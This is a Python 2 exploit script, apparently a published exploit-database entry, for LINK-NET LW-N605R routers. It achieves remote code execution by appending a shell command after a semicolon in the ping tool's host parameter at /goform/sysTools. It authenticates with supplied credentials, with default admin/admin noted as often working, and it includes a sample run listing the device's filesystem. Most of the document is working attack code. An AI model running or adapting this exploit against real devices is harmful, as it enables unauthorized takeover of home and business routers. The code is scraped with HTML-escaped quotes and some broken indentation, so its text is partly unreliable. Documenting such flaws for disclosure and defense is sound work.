# Author: Nassim Asrir
# Vendor: LINK-NET
# Product Link: http://linknet-usa.com/main/product_info.php?products_id=35&language=es
# Firmware version: 12.20.2.1486
# CVE: N/A
 
# Description: LW-N605R devices allow Remote Code Execution via shell metacharacters in the 
# HOST field of the ping feature at adm/systools.asp.
# Authentication is needed but the default password of admin for the admin 
# account may be used in some cases.
 
# Example: 
# [root@parrot]â”€[/home/sniperpex/Desktop]
# #python ./blue.py -t http://host/ -c ls -u admin -p admin
 
&#039;&#039;&#039;
 _ __        __    _   _  __    ___  ____  ____     _____            _       _ _   
| |\ \      / /   | \ | |/ /_  / _ \| ___||  _ \   | ____|_  ___ __ | | ___ (_) |_ 
| | \ \ /\ / /____|  \| | &#039;_ \| | | |___ \| |_) |  |  _| \ \/ / &#039;_ \| |/ _ \| | __|
| |__\ V  V /_____| |\  | (_) | |_| |___) |  _ <   | |___ >  <| |_) | | (_) | | |_ 
|_____\_/\_/      |_| \_|\___/ \___/|____/|_| \_\  |_____/_/\_\ .__/|_|\___/|_|\__|
                                                              |_|                  
                                                                  @AsrirNassim        
[+] Connection in progress...
[+] Authentication in progress...
[+] Username & Password: OK
[+] Checking for vulnerability...
[!] Command "ls": was executed!
 
var
usr
tmp
sys
sbin
proc
mnt
media
lib
init
home
etc_ro
etc
dev
bin
&#039;&#039;&#039;
import urllib2
 
import base64
 
import optparse
 
import sys
 
import bs4
  
banner = """
 _ __        __    _   _  __    ___  ____  ____     _____            _       _ _   
| |\ \      / /   | \ | |/ /_  / _ \| ___||  _ \   | ____|_  ___ __ | | ___ (_) |_ 
| | \ \ /\ / /____|  \| | &#039;_ \| | | |___ \| |_) |  |  _| \ \/ / &#039;_ \| |/ _ \| | __|
| |__\ V  V /_____| |\  | (_) | |_| |___) |  _ <   | |___ >  <| |_) | | (_) | | |_ 
|_____\_/\_/      |_| \_|\___/ \___/|____/|_| \_\  |_____/_/\_\ .__/|_|\___/|_|\__|
                                                              |_|                  
                                                                  @AsrirNassim        
"""
 
# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print(&#039;[X] You must insert http:// or https:// procotol&#039;)
        
        sys.exit(1)
    else:
        return url+"/goform/sysTools"
  
def connectionScan(url,user,pwd,cmd):
    print &#039;[+] Connection in progress...&#039;
    try:
        response = urllib2.Request(url)
        content = urllib2.urlopen(response)
        print &#039;[X] LW-N605R Authentication not found&#039;
    except urllib2.HTTPError, e:
        if e.code == 404:
            print &#039;[X] Page not found&#039;
        elif e.code == 401:
            try:
                print &#039;[+] Authentication in progress...&#039;
                base64string = base64.encodestring(&#039;%s:%s&#039; % (user, pwd)).replace(&#039;\n&#039;, &#039;&#039;)         
                response = urllib2.Request(url+"/goform/sysTools?tool=0&pingCount=4&host=127.0.0.1;"+cmd+"&sumbit=OK", None)
                response.add_header("Authorization", "Basic %s" % base64string)
                content = urllib2.urlopen(response).read()
                if "putmsg(mPingCount);" in content:
                    print &#039;[+] Username & Password: OK&#039;
                    print &#039;[+] Checking for vulnerability...&#039;
                    if &#039;e&#039; in  content:
                        print &#039;[!] Command "&#039;+cmd+&#039;": was executed!&#039;
                    else:
                        print &#039;[X] Not Vulnerable :(&#039;
                else:
                     print &#039;[X] No LW-N605R page found&#039;
                soup = bs4.BeautifulSoup(content, &#039;html.parser&#039;)
 
        for textarea in soup.find_all(&#039;textarea&#039;):
                    print textarea.get_text()
            except urllib2.HTTPError, e:
                if e.code == 401:
                   print &#039;[X] Wrong username or password&#039;
                else:
                   print &#039;[X] HTTP Error: &#039;+str(e.code)
            except urllib2.URLError:
                print &#039;[X] Connection Error&#039;
        else:
            print &#039;[X] HTTP Error: &#039;+str(e.code)
    except urllib2.URLError:
        print &#039;[X] Connection Error&#039;
  
commandList = optparse.OptionParser(&#039;usage: %prog -t https://target:444/ -u admin -p pwd -c "ls"&#039;)
commandList.add_option(&#039;-t&#039;, &#039;--target&#039;, action="store",
                  help="Insert TARGET URL",
                  )
commandList.add_option(&#039;-c&#039;, &#039;--cmd&#039;, action="store",
                  help="Insert command name",
                  )
commandList.add_option(&#039;-u&#039;, &#039;--user&#039;, action="store",
                  help="Insert username",
                  )
commandList.add_option(&#039;-p&#039;, &#039;--pwd&#039;, action="store",
                  help="Insert password",
                  )
options, remainder = commandList.parse_args()
  
# Check args
if not options.target or not options.cmd or not options.user or not options.pwd:
    print(banner)
    commandList.print_help()
    sys.exit(1)
  
print(banner)
  
url = checkurl(options.target)
cmd = options.cmd
user = options.user
pwd = options.pwd
  
connectionScan(url,user,pwd,cmd)

